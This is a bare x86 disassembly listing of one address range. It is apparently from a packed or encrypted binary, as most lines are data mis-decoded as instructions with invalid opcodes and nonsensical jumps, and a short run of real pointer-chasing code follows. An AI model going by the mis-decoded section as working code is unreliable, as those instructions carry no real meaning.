  403085:	cmp    eax,0x714fba2f
  40308a:	dec    eax
  40308b:	gs retf 0x5feb
  40308f:	repz mov eax,DWORD PTR [edx]
  403092:	jmp    0x2bfe:0x200e97a4
  403099:	pop    ecx
  40309a:	mov    bh,0x7c
  40309c:	push   ss
  40309d:	mov    al,0xf7
  40309f:	jg     0x403043
  4030a1:	push   ebp
  4030a2:	fwait
  4030a3:	popa   
  4030a4:	pop    ebp
  4030a5:	and    al,0x3c
  4030a7:	mov    dh,0x40
  4030a9:	dec    ecx
  4030aa:	ins    BYTE PTR es:[edi],dx
  4030ab:	out    dx,eax
  4030ac:	sar    DWORD PTR [ebp+0x7a],0xf8
  4030b0:	fiadd  WORD PTR [esi]
  4030b2:	das    
  4030b3:	cmp    BYTE PTR [edx],0x15
  4030b6:	daa    
  4030b7:	xor    eax,0x1e4cbdbc
  4030bc:	push   0x116ea0db
  4030c1:	xchg   edx,eax
  4030c2:	call   0x335be34a
  4030c7:	add    al,0xa2
  4030c9:	push   ecx
  4030ca:	add    al,0x4b
  4030cc:	mov    al,0x45
  4030ce:	(bad)  
  4030cf:	idiv   BYTE PTR [edx+0x66]
  4030d2:	mov    al,0xd3
  4030d4:	sub    esi,DWORD PTR [esi+ecx*8]
  4030d7:	pop    edi
  4030d8:	js     0x403079
  4030da:	sbb    al,0x4f
  4030dc:	add    ah,0x36
  4030df:	push   0x24
  4030e1:	push   ecx
  4030e2:	mov    al,0x94
  4030e4:	stos   DWORD PTR es:[edi],eax
  4030e5:	ja     0x403165
  4030e7:	outs   dx,BYTE PTR ds:[esi]
  4030e8:	call   0x8a3f:0x87a3073
  4030ef:	retf   
  4030f0:	push   esi
  4030f1:	bound  eax,QWORD PTR [esi]
  4030f3:	addr16 loopne 0x403080
  4030f6:	mov    bh,BYTE PTR [eax-0x21b47558]
  4030fc:	ret    0xba71
  4030ff:	cmp    ebx,DWORD PTR [ebp+eiz*8+0x777d5cee]
  403106:	mov    eax,0xa4309b13
  40310b:	mov    ecx,0x3046a105
  403110:	repz xchg ecx,eax
  403112:	popf   
  403113:	sar    bl,cl
  403115:	xchg   dh,dh
  403117:	std    
  403118:	outs   dx,BYTE PTR ds:[esi]
  403119:	imul   edi,DWORD PTR [ebp+0x0],0xffffff8b
  40311d:	xor    eax,0x39959963
  403122:	hlt    
  403123:	imul   DWORD PTR [eax-0x1c]
  403126:	push   cs
  403127:	test   BYTE PTR [edi-0x6b],dl
  40312a:	or     dl,cl
  40312c:	fsubr  QWORD PTR [ebx-0x600372e3]
  403132:	cmp    al,0x34
  403134:	mov    bh,0xb8
  403136:	mov    ah,0xa7
  403138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403139:	inc    esi
  40313a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40313b:	mov    dh,0xec
  40313d:	xor    edi,edx
  40313f:	push   eax
  403140:	mov    ds:0x2c01a128,eax
  403145:	jb     0x40318d
  403147:	add    eax,0x653c76f6
  40314c:	outs   dx,DWORD PTR ds:[esi]
  40314d:	push   cs
  40314e:	cld    
  40314f:	mov    ah,0x46
  403151:	mov    DWORD PTR [ebx],edi
  403153:	xchg   edi,eax
  403154:	mov    fs,ebx
  403156:	and    BYTE PTR [ecx],bl
  403158:	pop    ds
  403159:	and    BYTE PTR [eax+0x13],0xea
  40315d:	mov    esi,0x2a7ae353
  403162:	jg     0x4031dc
  403164:	popa   
  403165:	(bad)  
  403166:	and    al,0x74
  403168:	sbb    edx,DWORD PTR [esi+0x4b]
  40316b:	add    ebx,DWORD PTR ds:0x1467ee8d
  403171:	(bad)  
  403172:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  403174:	enter  0x63a,0x4
  403178:	cmp    ebp,0x191a9465
  40317e:	mov    esp,ebx
  403180:	int3   
  403181:	stos   BYTE PTR es:[edi],al
  403182:	sub    ecx,DWORD PTR [ebx+0x10]
  403185:	mov    cl,0x1c
  403187:	in     al,0xaa
  403189:	mov    edx,0x9a5ed8f3
  40318e:	call   DWORD PTR fs:[ebp-0x45daef83]
  403195:	lock and ebx,ecx
  403198:	fst    QWORD PTR [ecx+edi*8]
  40319b:	sti    
  40319c:	cdq    
  40319d:	jge    0x403138
  40319f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031a0:	jp     0x4031be
  4031a2:	pop    edx
  4031a3:	push   esp
  4031a4:	mov    cl,0x5f
  4031a6:	outs   dx,DWORD PTR ds:[esi]
  4031a7:	xchg   edi,eax
  4031a8:	std    
  4031a9:	mov    ebx,0xe24dafbb
  4031ae:	int    0x0
  4031b0:	out    0xcd,eax
  4031b2:	aam    0x70
  4031b4:	data16 sub BYTE PTR cs:[edi+0x6e6aacc0],al
  4031bc:	or     al,0xfb
  4031be:	cmp    al,0x68
  4031c0:	repz (bad) 
  4031c2:	xor    bl,BYTE PTR [ebp-0x45]
  4031c5:	rcr    BYTE PTR [edx-0x6b5cc387],1
  4031cb:	js     0x40315b
  4031cd:	jecxz  0x4031ad
  4031cf:	xchg   ecx,eax
  4031d0:	pop    ebp
  4031d1:	or     ecx,eax
  4031d3:	clc    
  4031d4:	sub    esp,DWORD PTR [ebx-0x2631c969]
  4031da:	adc    al,0x36
  4031dc:	mov    ebp,0x3927f6a1
  4031e1:	xor    esp,ecx
  4031e3:	sub    eax,0xe0e71ad8
  4031e8:	pop    esp
  4031e9:	xor    esi,DWORD PTR [ecx+0x37]
  4031ec:	sbb    BYTE PTR [ecx-0x10893fc],cl
  4031f2:	jmp    0x6ac9cbda
  4031f7:	dec    ebx
  4031f8:	xchg   esp,eax
  4031f9:	mov    edx,0xa1a53d41
  4031fe:	mov    ebp,edi
  403200:	dec    ebx
  403201:	add    dl,BYTE PTR [ebp-0x22]
  403204:	mov    esi,0x8ff07836
  403209:	in     eax,0x5d
  40320b:	call   0x5bb5:0xeab3c49
  403212:	adc    eax,0x9267c964
  403217:	jmp    0x8f6e:0xac283606
  40321e:	les    ecx,FWORD PTR [eax-0x4d]
  403221:	loopne 0x40328a
  403223:	dec    ecx
  403224:	mov    BYTE PTR [edi],cl
  403226:	das    
  403227:	xchg   ebx,eax
  403228:	and    eax,0xa41903a0
  40322d:	aas    
  40322e:	xchg   edx,eax
  40322f:	cld    
  403230:	lds    esi,FWORD PTR [ecx-0x6df56087]
  403236:	inc    esi
  403237:	pop    edi
  403238:	call   0xad47:0x7ea75b50
  40323f:	cli    
  403240:	xchg   ecx,eax
  403241:	adc    edx,eax
  403243:	push   0xe7ca2891
  403248:	imul   edi,DWORD PTR [ecx+0x58],0x38
  40324c:	ds pop ebp
  40324e:	and    ebx,DWORD PTR [ecx+0x66]
  403251:	sub    cl,BYTE PTR [eax-0x45]
  403254:	jmp    0x403201
  403256:	es xor al,0x18
  403259:	jmp    0x82be:0xbde2e9f2
  403260:	adc    BYTE PTR ds:0x3b7a30ff,dl
  403266:	popa   
  403267:	add    al,0xb8
  403269:	(bad)  
  40326b:	fcmovu st,st(3)
  40326d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326e:	(bad)  
  40326f:	fcomp  DWORD PTR [eax]
  403271:	cmc    
  403272:	test   al,0x9b
  403274:	aad    0xd8
  403276:	mov    esp,0xa27e5771
  40327b:	mov    ds:0xa5e2dd4,al
  403280:	std    
  403281:	mov    al,0x48
  403283:	test   al,0x43
  403285:	mov    edx,0xc9adece9
  40328a:	outs   dx,BYTE PTR ds:[esi]
  40328b:	nop
  40328c:	xor    al,bl
  40328e:	pop    eax
  40328f:	call   0x6bf49aa2
  403294:	mov    eax,0x33dba5b0
  403299:	or     ch,dl
  40329b:	fmul   DWORD PTR [edi]
  40329d:	xchg   ebx,eax
  40329e:	push   ds
  40329f:	and    bh,BYTE PTR [ecx+eiz*4-0x506ca01e]
  4032a6:	sub    DWORD PTR [edx-0x10af7b8c],eax
  4032ac:	popf   
  4032ad:	push   0x1b329978
  4032b2:	jg     0x403265
  4032b4:	addr16 jne 0x4032f9
  4032b7:	out    dx,eax
  4032b8:	imul   ebx,DWORD PTR [ebx+0x79],0x16fc7365
  4032bf:	jae    0x403337
  4032c1:	xor    eax,0x78f6ed97
  4032c6:	lea    esp,[eax]
  4032c8:	sub    BYTE PTR [bp+0x47ed],dl
  4032cd:	mov    BYTE PTR [ecx+0x1b],cl
  4032d0:	xchg   ebp,eax
  4032d1:	ds ds jg 0x40334a
  4032d5:	or     al,0x5
  4032d7:	xor    ebx,0xc87e3b05
  4032dd:	push   0x4fc35613
  4032e2:	fadd   st(6),st
  4032e4:	sub    bl,ah
  4032e6:	and    ah,dh
  4032e8:	sub    dl,BYTE PTR [ecx-0x1651285d]
  4032ee:	and    DWORD PTR [ecx-0x58],esi
  4032f1:	sbb    BYTE PTR [esi-0x18182e2e],cl
  4032f7:	sub    BYTE PTR [edi+ebp*4-0x3d270ed9],ah
  4032fe:	adc    edx,DWORD PTR [ebx+0x74838906]
  403304:	pop    ss
  403305:	aam    0xe3
  403307:	sbb    ch,bl
  403309:	jbe    0x40334f
  40330b:	mov    edx,0x30f1e80f
  403310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403311:	or     dh,BYTE PTR [ebx]
  403313:	mov    esp,0xd30347bf
  403318:	jmp    0xec75c6af
  40331d:	hlt    
  40331e:	and    DWORD PTR [ebx+0x3aa8ce2],edx
  403324:	cmp    BYTE PTR ss:[edx-0x2f3c5262],ch
  40332b:	inc    ebp
  40332c:	out    dx,al
  40332d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40332e:	popa   
  40332f:	xchg   esi,eax
  403330:	mov    eax,DWORD PTR [ebx]
  403332:	mov    dh,0x7f
  403334:	es mov bh,0xfb
  403337:	test   bl,bh
  403339:	push   ebx
  40333a:	cli    
  40333b:	(bad)  
  40333c:	lock adc eax,0x5671b748
  403342:	push   ebx
  403343:	cmc    
  403344:	fisttp QWORD PTR [esi+eiz*1]
  403347:	sub    ebp,DWORD PTR [ebx+edi*1]
  40334a:	push   ebp
  40334b:	into   
  40334c:	retf   0x8ce8
  40334f:	loopne 0x403379
  403351:	and    edx,DWORD PTR [esi+0x46a50365]
  403357:	cld    
  403358:	shl    edi,0x65
  40335b:	out    dx,al
  40335c:	inc    ebx
  40335d:	adc    al,0x66
  40335f:	dec    eax
  403360:	jmp    0xada04219
  403365:	xor    DWORD PTR [esp+esi*8],ebp
  403368:	pop    ds
  403369:	cmc    
  40336a:	sbb    DWORD PTR [ebx+0x14b9f5ec],ebp
  403370:	pop    edx
  403371:	std    
  403372:	pop    ebx
  403373:	adc    esi,ebx
  403375:	xor    edi,DWORD PTR [eax]
  403377:	cwde   
  403378:	or     esp,ebx
  40337a:	dec    ecx
  40337b:	jecxz  0x403331
  40337d:	sbb    al,0x2e
  40337f:	fmul   QWORD PTR [edi]
  403381:	and    ebx,edx
  403383:	jns    0x403348
  403385:	sub    edi,DWORD PTR [edx+0x218e5dde]
  40338b:	sub    dl,BYTE PTR [ebx+0x48c7b2cd]
  403391:	add    eax,0x1b8093df
  403396:	xchg   edx,eax
  403397:	fwait
  403398:	sbb    DWORD PTR [ecx+0x2f6dae0d],edx
  40339e:	xor    ah,BYTE PTR [ecx+0xcb998bf]
  4033a4:	mov    bl,0xac
  4033a6:	push   0x35bccd80
  4033ab:	jns    0x403369
  4033ad:	lds    esp,FWORD PTR [ecx+0x67]
  4033b0:	test   dl,dh
  4033b2:	xor    bh,bl
  4033b4:	out    0x8e,al
  4033b6:	ins    BYTE PTR es:[edi],dx
  4033b7:	ja     0x403341
  4033b9:	push   esp
  4033ba:	sbb    al,BYTE PTR [ebp+0x2a655e66]
  4033c0:	bnd jmp 0x4b8f2386
  4033c6:	mov    ecx,0x32af0b03
  4033cb:	sbb    DWORD PTR [edi+eiz*1-0x3d],edx
  4033cf:	shl    BYTE PTR ds:[ebx+0x12f1c653],0x14
  4033d7:	xchg   esp,eax
  4033d8:	in     eax,0x25
  4033da:	cs or  eax,0xebb7f64b
  4033e0:	(bad)  
  4033e1:	sbb    eax,0xd0ece1c6
  4033e6:	int    0x56
  4033e8:	inc    esi
  4033e9:	mov    bh,0xd2
  4033eb:	cld    
  4033ec:	retf   0x4dc3
  4033ef:	and    edx,DWORD PTR [ebp+0x1d52ed6c]
  4033f5:	or     al,BYTE PTR [esi+0x522506a9]
  4033fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033fc:	adc    BYTE PTR [ebp+0x75dfd95b],bh
  403402:	and    edx,DWORD PTR ds:0xc22119ce
  403408:	rcl    BYTE PTR [esi+0x270ad271],cl
  40340e:	aas    
  40340f:	fs sbb al,0x5b
  403412:	outs   dx,BYTE PTR ds:[esi]
  403413:	jl     0x40340c
  403415:	(bad)  
  403417:	add    DWORD PTR [ebp-0xa],0xffffffde
  40341b:	add    bl,ah
  40341d:	dec    esp
  40341e:	fwait
  40341f:	mov    dl,0xa5
  403421:	outs   dx,BYTE PTR ds:[esi]
  403422:	xchg   DWORD PTR ds:0x6a680214,edx
  403428:	fdiv   st,st(6)
  40342a:	outs   dx,BYTE PTR ds:[esi]
  40342b:	dec    edi
  40342c:	xchg   ecx,eax
  40342d:	mov    ecx,0xe1f64a7c
  403432:	fmulp  st(3),st
  403434:	push   edx
  403435:	icebp  
  403436:	xor    eax,DWORD PTR [ebx-0xb]
  403439:	xchg   edx,eax
  40343a:	xchg   esi,eax
  40343b:	mov    al,BYTE PTR [edx+0x62]
  40343e:	xor    eax,0xabb04c59
  403443:	jp     0x403489
  403445:	sbb    BYTE PTR [edx+0x56127b1a],0x1b
  40344c:	lods   eax,DWORD PTR ds:[esi]
  40344d:	xor    BYTE PTR [esi+0x11],0xbe
  403451:	or     BYTE PTR [ebp-0x25ec5d0e],bh
  403457:	mov    al,ds:0x9dc2bff2
  40345c:	push   esp
  40345d:	cmp    eax,0xae9ad3dd
  403462:	es shr ebx,0x46
  403466:	jne    0x4034c3
  403468:	jmp    0xbf192cfa
  40346d:	stos   BYTE PTR es:[edi],al
  40346e:	push   esi
  40346f:	adc    DWORD PTR [eax+0x40a711f7],edi
  403475:	adc    BYTE PTR [esi],0x24
  403478:	ins    DWORD PTR es:[edi],dx
  403479:	xor    eax,0x17c58651
  40347e:	xor    edx,esi
  403480:	xchg   ecx,eax
  403481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403482:	mov    al,ds:0x525fcc68
  403487:	pop    ebp
  403488:	dec    ebx
  403489:	test   eax,0x679ce7ca
  40348e:	sbb    cl,cl
  403490:	sub    ecx,ebx
  403492:	xor    BYTE PTR [ebx-0x48],cl
  403495:	adc    ah,BYTE PTR [edx+0x365d154d]
  40349b:	js     0x40349b
  40349d:	arpl   WORD PTR [esi],bx
  40349f:	mov    cs,ebx
  4034a1:	or     edi,DWORD PTR [esi-0x7b]
  4034a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034a5:	in     eax,dx
  4034a6:	mov    BYTE PTR [eax-0x5e971a0f],bh
  4034ac:	push   ecx
  4034ad:	push   edx
  4034ae:	cmc    
  4034af:	and    ebx,DWORD PTR [eax-0x11]
  4034b2:	adc    BYTE PTR [edi],al
  4034b4:	xchg   esi,eax
  4034b5:	or     bl,ah
  4034b7:	data16 aas 
  4034b9:	xor    edx,esp
  4034bb:	xor    eax,0x8b7ee7bd
  4034c0:	retf   
  4034c1:	das    
  4034c2:	iret   
  4034c3:	dec    ebx
  4034c4:	nop
  4034c5:	popa   
  4034c6:	test   BYTE PTR [edx+0x1e],ch
  4034c9:	fwait
  4034ca:	aas    
  4034cb:	xchg   ebx,eax
  4034cc:	in     eax,dx
  4034cd:	jnp    0x4034b9
  4034cf:	mov    dh,0x1e
  4034d1:	jmp    0xf3828173
  4034d6:	or     esi,DWORD PTR [edx+ebx*8-0x26935966]
  4034dd:	sub    edx,DWORD PTR [eax]
  4034df:	cmp    cl,BYTE PTR [esi]
  4034e1:	dec    esi
  4034e2:	push   esi
  4034e3:	xchg   BYTE PTR [esi+0x30ad1d99],ch
  4034e9:	adc    DWORD PTR [ebx+0x48b371a8],0x2a
  4034f0:	push   ebx
  4034f1:	sub    eax,0xdd639342
  4034f6:	and    dh,bh
  4034f8:	int3   
  4034f9:	sbb    al,0x4d
  4034fb:	xor    BYTE PTR [ebp-0x1b],ah
  4034fe:	sub    DWORD PTR [eax+0x42b794da],ebx
  403504:	lods   al,BYTE PTR ds:[esi]
  403505:	xor    eax,0xde0afd14
  40350a:	mov    eax,ds:0x559a4a4f
  40350f:	jo     0x40356c
  403511:	lahf   
  403512:	ins    DWORD PTR es:[edi],dx
  403513:	jl     0x4034ea
  403515:	pop    eax
  403516:	xchg   ebp,eax
  403517:	les    ecx,FWORD PTR [edx-0x3f7e5063]
  40351d:	mov    esi,0xc36d6fb6
  403522:	or     dl,BYTE PTR [ebp-0x5d71dc88]
  403528:	sbb    eax,0x80ddeead
  40352d:	test   DWORD PTR [ecx],edi
  40352f:	outs   dx,DWORD PTR ds:[esi]
  403530:	inc    edx
  403531:	inc    eax
  403532:	test   DWORD PTR [ebx],edi
  403534:	pop    eax
  403535:	inc    eax
  403536:	js     0x4035a2
  403538:	fild   QWORD PTR [edx+0x37]
  40353b:	in     eax,dx
  40353c:	mov    dh,0x4b
  40353e:	or     ebp,DWORD PTR [edx+0x8e2ff58]
  403544:	and    bl,BYTE PTR [esi+0xc]
  403547:	retf   
  403548:	inc    edx
  403549:	imul   ebp,DWORD PTR [esi+0x56],0x5c729172
  403550:	ins    DWORD PTR es:[edi],dx
  403551:	cmp    edi,DWORD PTR [ecx+0x73]
  403554:	jnp    0x4035c0
  403556:	imul   esi,DWORD PTR [edi+0xe64fbd9],0xffffffd4
  40355d:	sub    eax,0x7deb1fcc
  403562:	push   es
  403563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403564:	in     al,0xa9
  403566:	mov    dl,0x6b
  403568:	jno    0x4035b3
  40356a:	push   0x71
  40356c:	call   0xcd04:0xf659891
  403573:	(bad)  
  403574:	stos   DWORD PTR es:[edi],eax
  403575:	dec    esp
  403576:	out    dx,al
  403577:	and    ebp,DWORD PTR [eax+0x61]
  40357a:	shl    cl,1
  40357c:	ficom  DWORD PTR [ecx+0x343be2ba]
  403582:	gs ret 0xc507
  403586:	mov    eax,ds:0xe8425216
  40358b:	cmp    bl,ch
  40358d:	ror    BYTE PTR [edx],1
  40358f:	es pop eax
  403591:	stc    
  403592:	icebp  
  403593:	outs   dx,DWORD PTR ds:[esi]
  403594:	cmc    
  403595:	inc    edx
  403596:	jmp    ecx
  403598:	pusha  
  403599:	repz popa 
  40359b:	daa    
  40359c:	fs icebp 
  40359e:	nop
  40359f:	pop    edx
  4035a0:	loop   0x4035c9
  4035a2:	push   ss
  4035a3:	imul   ebp,DWORD PTR [ebx+0x6bbcc110],0x73
  4035aa:	xor    eax,0xd7f9b87d
  4035af:	mov    eax,DWORD PTR [ecx-0x583e787f]
  4035b5:	ins    DWORD PTR es:[edi],dx
  4035b6:	adc    BYTE PTR [esi+edx*4-0x1d],cl
  4035ba:	adc    al,0x87
  4035bc:	shl    edi,0xd9
  4035bf:	lock cmc 
  4035c1:	ss add al,0x6d
  4035c4:	rol    BYTE PTR [eax-0x77],1
  4035c7:	(bad)  
  4035c8:	aam    0x36
  4035ca:	scas   al,BYTE PTR es:[edi]
  4035cb:	mov    ah,0x2e
  4035cd:	shr    BYTE PTR [ebx-0x7a],1
  4035d0:	adc    ah,BYTE PTR cs:[ebp+0x29fa2415]
  4035d7:	jne    0x40356b
  4035d9:	(bad)  
  4035db:	dec    ebx
  4035dc:	dec    esi
  4035dd:	(bad)  
  4035de:	scas   al,BYTE PTR es:[edi]
  4035df:	mov    esi,0x8fb42a94
  4035e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035e5:	mov    esi,0x105d09d8
  4035ea:	mov    eax,ds:0x18115af3
  4035ef:	dec    ebx
  4035f0:	xor    al,0xed
  4035f2:	(bad)  [ebx]
  4035f4:	jns    0x40364a
  4035f6:	push   edi
  4035f8:	shr    BYTE PTR [ebx],1
  4035fa:	and    BYTE PTR [edi+eiz*8],ah
  4035fd:	adc    cl,0x68
  403600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403601:	lock add eax,0x234d8fa3
  403607:	retf   
  403608:	pop    edi
  403609:	(bad)
  40360e:	pop    esi
  40360f:	adc    eax,0x19a6dbe9
  403614:	jne    0x4035ca
  403616:	pop    ebp
  403617:	add    al,0xf2
  403619:	and    eax,0x336c0d97
  40361e:	les    esi,FWORD PTR [ecx]
  403620:	sub    esp,esp
  403622:	and    bl,BYTE PTR [esi-0x77451c9d]
  403628:	stos   BYTE PTR es:[edi],al
  403629:	mov    eax,ds:0x5c97a601
  40362e:	(bad)  [eax-0x3b]
  403631:	shl    DWORD PTR [esi+0x7f],0x3e
  403635:	int3   
  403636:	test   al,0xe5
  403638:	xor    eax,0xba6c91b8
  40363d:	inc    esi
  40363e:	adc    al,BYTE PTR [edi]
  403640:	(bad)  
  403641:	aaa    
  403642:	fwait
  403643:	sub    dl,BYTE PTR [ebx+0xff48b34]
  403649:	xor    eax,0x684c588e
  40364e:	jns    0x403673
  403650:	in     eax,0x5f
  403652:	mov    dl,0xc9
  403654:	in     al,dx
  403655:	dec    edi
  403656:	rcl    DWORD PTR [edx],1
  403658:	ins    DWORD PTR es:[edi],dx
  403659:	xchg   edx,eax
  40365a:	xchg   edx,eax
  40365b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40365c:	ins    BYTE PTR es:[edi],dx
  40365d:	jnp    0x403624
  40365f:	jg     0x40368b
  403661:	push   cs
  403662:	stos   BYTE PTR es:[edi],al
  403663:	mov    bh,0x3c
  403665:	push   cs
  403666:	jno    0x40362b
  403668:	out    dx,al
  403669:	into   
  40366a:	scas   al,BYTE PTR es:[edi]
  40366b:	out    0x8a,eax
  40366d:	mov    ecx,0x6cdbe53b
  403672:	fnstsw WORD PTR [ecx+esi*8+0x4d75ee30]
  403679:	add    DWORD PTR [ebx-0x1e],ebx
  40367c:	(bad)  
  40367e:	xchg   esp,eax
  40367f:	shl    al,0xb1
  403682:	js     0x403680
  403684:	mov    ds:0xc27676a6,al
  403689:	jg     0x403694
  40368b:	cwde   
  40368c:	xor    al,cl
  40368e:	xor    al,0xd9
  403690:	add    BYTE PTR [edi],bl
  403692:	not    DWORD PTR [esi]
  403694:	mov    ebx,0xe960704f
  403699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40369a:	cdq    
  40369b:	imul   ebp,DWORD PTR [ebp-0x384a771c],0x3f
  4036a2:	out    dx,al
  4036a3:	jle    0x4036a9
  4036a5:	or     DWORD PTR [ebx],edi
  4036a7:	xor    ebp,DWORD PTR [esi-0x1b]
  4036aa:	xchg   ebp,eax
  4036ab:	addr16 loop 0x403696
  4036ae:	xchg   ebx,eax
  4036af:	arpl   WORD PTR [edi-0x30],ax
  4036b2:	enter  0x83a6,0x2b
  4036b6:	xchg   DWORD PTR [edi-0x2e336cd1],ebp
  4036bc:	or     eax,0x374852ac
  4036c1:	xor    BYTE PTR [edi-0x53c6bd77],al
  4036c7:	in     eax,0x75
  4036c9:	jns    0x403713
  4036cb:	imul   esp,eax,0xf504f5dc
  4036d1:	xlat   BYTE PTR ds:[ebx]
  4036d2:	pop    edx
  4036d3:	mov    ebx,0x4b48e984
  4036d8:	push   eax
  4036d9:	xchg   esp,eax
  4036da:	(bad)  
  4036dc:	aas    
  4036dd:	adc    ah,BYTE PTR [edx-0x6a]
  4036e0:	xor    BYTE PTR [ecx+ebx*1],bl
  4036e3:	jne    0x40372d
  4036e5:	push   ecx
  4036e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e7:	mov    WORD PTR [esi+0x7],?
  4036ea:	mov    ah,0xb1
  4036ec:	push   edi
  4036ed:	jbe    0x4036f2
  4036ef:	lds    ecx,FWORD PTR [esi-0xf]
  4036f2:	sub    eax,0x24c78cb
  4036f7:	test   DWORD PTR [esp+ecx*1+0x5e],eax
  4036fb:	sbb    bh,ch
  4036fd:	push   eax
  4036fe:	sbb    BYTE PTR ss:[edi+ebx*2-0x9],0x15
  403704:	push   cs
  403705:	or     BYTE PTR ss:[eax],al
  403708:	call   0x808246cb
  40370d:	push   ss
  40370e:	jns    0x4036c5
  403710:	cli    
  403711:	fcom   DWORD PTR [edi]
  403713:	data16 sbb bh,BYTE PTR [ebp+0x7694b77a]
  40371a:	retf   0xbf3
  40371d:	dec    ebx
  40371e:	xchg   BYTE PTR [edi+edi*1],bl
  403721:	or     eax,0x6c970735
  403726:	sbb    DWORD PTR [ebx+0xdb74453],edx
  40372c:	arpl   WORD PTR [esi+0x7d],di
  40372f:	push   ss
  403730:	mov    bh,0xdd
  403732:	sub    dl,BYTE PTR [ecx+0x49]
  403735:	out    0x40,eax
  403737:	mov    gs,WORD PTR [ebp+0x63f95bd4]
  40373d:	cwde   
  40373e:	stos   DWORD PTR es:[edi],eax
  40373f:	pop    ebp
  403740:	jno    0x4036ce
  403742:	pop    ss
  403743:	leave  
  403744:	mov    al,ds:0xd3c70e6f
  403749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40374a:	inc    eax
  40374b:	push   esi
  40374c:	test   DWORD PTR [ebx],esi
  40374e:	imul   ebx,eax,0x4
  403751:	jb     0x403751
  403753:	lods   al,BYTE PTR ds:[esi]
  403754:	add    DWORD PTR [edi],eax
  403756:	fwait
  403757:	and    ch,BYTE PTR [edi]
  403759:	out    dx,eax
  40375a:	in     al,dx
  40375b:	(bad)  
  40375c:	shl    BYTE PTR [edx],1
  40375e:	out    dx,eax
  40375f:	(bad)  
  403760:	lock jo 0x40378e
  403763:	test   esp,esp
  403765:	jmp    DWORD PTR [edi+edi*4-0x79]
  403769:	out    0x15,al
  40376b:	das    
  40376c:	mov    esp,es
  40376e:	(bad)  
  40376f:	daa    
  403770:	push   0x2e
  403772:	ins    DWORD PTR es:[edi],dx
  403773:	popf   
  403774:	inc    eax
  403775:	adc    BYTE PTR [ebx+0x20],ch
  403778:	test   bl,ah
  40377a:	sub    eax,0x6c5cfc0b
  40377f:	rcr    ah,0x32
  403782:	in     al,dx
  403783:	push   eax
  403784:	gs mov esp,0xb92394d3
  40378a:	xchg   DWORD PTR [ecx],edx
  40378c:	xchg   esi,eax
  40378d:	jl     0x4037d2
  40378f:	sub    BYTE PTR [ebp-0x414ebc26],dh
  403795:	je     0x4037f9
  403797:	mov    ebx,0x86f127d1
  40379c:	call   FWORD PTR [edx]
  40379e:	ins    DWORD PTR es:[edi],dx
  40379f:	pop    edi
  4037a0:	fst    DWORD PTR [esi-0x60]
  4037a3:	lods   al,BYTE PTR ds:[esi]
  4037a4:	adc    bl,BYTE PTR [esi-0x61b4291b]
  4037aa:	je     0x4037c9
  4037ac:	xor    dl,0x46
  4037af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037b0:	inc    ecx
  4037b1:	jns    0x403797
  4037b3:	in     al,0x74
  4037b5:	sub    DWORD PTR ds:0xfd525a63,esi
  4037bb:	fnstenv [esi-0x67c6b5cf]
  4037c1:	mov    al,ds:0x5f68483c
  4037c6:	repz inc ecx
  4037c8:	dec    edi
  4037c9:	lock add al,0xbf
  4037cc:	add    eax,ebx
  4037ce:	arpl   WORD PTR [eax],cx
  4037d0:	inc    eax
  4037d1:	fmulp  st(7),st
  4037d3:	or     BYTE PTR [ebp+0x7b0f75b0],dh
  4037d9:	mov    ch,0x69
  4037db:	push   ecx
  4037dc:	shl    BYTE PTR [ebx+eax*8-0x18fee033],cl
  4037e3:	add    BYTE PTR [esi+0x4f814d6b],cl
  4037e9:	mov    bh,0x24
  4037eb:	sub    eax,0x6fe8dcb3
  4037f0:	jbe    0x4037f3
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
